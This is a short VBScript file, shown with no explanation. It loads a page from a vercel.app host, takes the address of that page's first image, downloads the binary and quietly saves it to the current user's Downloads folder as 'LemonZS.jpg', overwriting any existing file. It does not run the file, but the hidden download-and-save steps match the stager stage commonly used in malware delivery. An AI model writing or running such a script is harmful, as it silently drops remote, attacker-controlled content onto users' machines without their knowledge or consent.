Dim document : Set document = WScript.GetObject("https://pwcreatures.vercel.app/bin/oQgVEcfyA6NGPHjrAAzAIkKA93lg0CAAAeh7Nb~noop.jpeg")
While document.readyState <> "complete" : WScript.Sleep 200 : Wend
Dim xhr : Set xhr = CreateObject("MSXML2.XMLHTTP.3.0")
xhr.open "GET", document.getElementsByTagName("img")(0).src, False
xhr.send
Dim stream : Set stream = CreateObject("Adodb.Stream")
stream.Type = 1
stream.Open
stream.Write xhr.responseBody
Dim wshNetwork : Set wshNetwork = CreateObject("WScript.Network")
Dim strUsername : strUsername = wshNetwork.UserName
stream.SaveToFile "C:\Users\" & strUsername & "\Downloads\LemonZS.jpg", 2
stream.Close